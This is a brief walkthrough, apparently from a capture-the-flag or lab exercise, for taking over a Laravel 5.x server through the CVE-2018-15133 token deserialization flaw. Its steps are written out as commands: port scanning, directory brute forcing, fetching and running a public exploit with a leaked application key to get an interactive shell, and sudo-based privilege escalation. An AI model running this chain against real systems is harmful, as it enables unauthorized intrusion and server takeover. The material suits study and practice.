### Laravel 5.x Token Deserialization

**1. Port Scan**

```bash
 sudo nmap -sS -sV -sC --top-ports 100 ip_address -oX ip_address
 ```
 
 **2. Web Directory Brute Force**
 
 ```bash
 dirsearch -u http://ip_address
 ```
 
** 3. Search posible Laravel 5.x exploit**
 
 ```bash
 searchsploit laravel
 ```
 
** 4. Exploit**
 
 ```bash
git clone https://github.com/aljavier/exploit_laravel_cve-2018-15133
cd exploit_laravel_cve-2018-15133/
pip3 install -r requirements.txt

python3 pwn_laravel.py http://ip_address/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive
```

**5. Privellege Escalation**

```bash
sudo -l

# https://gtfobins.github.io/
```